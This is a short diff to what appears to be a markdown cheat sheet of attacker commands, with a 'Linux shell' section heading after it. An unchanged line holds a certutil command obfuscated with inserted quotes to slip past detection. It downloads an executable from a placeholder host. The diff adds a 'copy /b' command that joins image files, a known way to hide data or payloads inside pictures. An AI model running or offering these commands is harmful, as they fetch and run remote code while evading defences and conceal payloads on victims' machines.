@@ -17,7 +17,11 @@
 
 ```sh
 c""""e""""r""""t""""u""""t""""i""""l.exe -urlcache -split -f http://ip/6666.exe 6666.exe
+
+copy /b 1.jpg+2.jpg 3 /y
+
 ```
+
 
 # Linux shell
 
